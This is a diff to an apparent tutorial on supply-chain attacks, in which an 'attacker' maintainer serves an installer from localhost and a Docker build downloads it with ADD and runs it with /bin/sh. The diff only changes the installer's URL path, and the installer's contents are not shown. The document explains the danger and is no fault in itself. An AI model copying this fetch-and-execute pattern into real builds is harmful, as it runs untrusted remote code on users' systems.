@@ -48,7 +48,7 @@ After that the maintainer (the attacker) decided to download an installer from a
 
 The victim, knowing that copying installer from remote URLs is bad, decides to take a look at the installer.
 ```
-curl http://localhost:1337/installer.sh
+curl http://localhost:1337/script/installer.sh
 ```
 
 The output is very simple( do not copy this)
@@ -72,7 +72,7 @@ Step 1/5 : FROM debian:buster-slim
  ---> 837fd7c8d960
 Step 2/5 : COPY my_wrapper-script.sh /my_wrapper_script.sh
  ---> 1eadaf5c3365
-Step 3/5 : ADD http://localhost:1337/installer.sh /tmp/installer.sh
+Step 3/5 : ADD http://localhost:1337/script/installer.sh /tmp/installer.sh
 Downloading [==================================================>]     412B/412B
  ---> 82e3b8007746
 Step 4/5 : RUN chmod +x /tmp/installer.sh; /bin/sh /tmp/installer.sh
